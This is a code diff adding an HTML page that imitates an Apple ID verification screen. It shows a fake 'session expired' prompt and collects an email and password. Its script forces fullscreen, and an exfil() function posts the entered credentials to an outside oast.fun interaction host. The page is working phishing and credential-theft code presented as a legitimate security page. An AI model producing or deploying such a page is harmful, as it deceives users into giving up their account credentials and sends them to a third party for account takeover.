@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Apple Security</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    html, body {
+      margin: 0; padding: 0;
+      font-family: -apple-system;
+      background: #fff;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    input, button {
+      font-size: 18px;
+      margin: 10px;
+      padding: 10px;
+      border-radius: 10px;
+    }
+    button {
+      background: #0071e3;
+      color: white;
+      border: none;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://www.apple.com/favicon.ico" width="60" />
+  <h2>Verify Apple ID</h2>
+  <p>Session expired. Please re-authenticate.</p>
+  <input type="email" placeholder="Apple ID" id="email">
+  <input type="password" placeholder="Password" id="pass">
+  <button onclick="exfil()">Continue</button>
+  <script>
+    document.documentElement.requestFullscreen().then(() => {
+      setTimeout(() => alert(""), 100); // gesture persistence
+    });
+
+    function exfil() {
+      fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
+        method: "POST",
+        body: JSON.stringify({
+          email: document.getElementById("email").value,
+          pass: document.getElementById("pass").value
+        }),
+        mode: "no-cors"
+      });
+    }
+  </script>
+</body>
+</html>
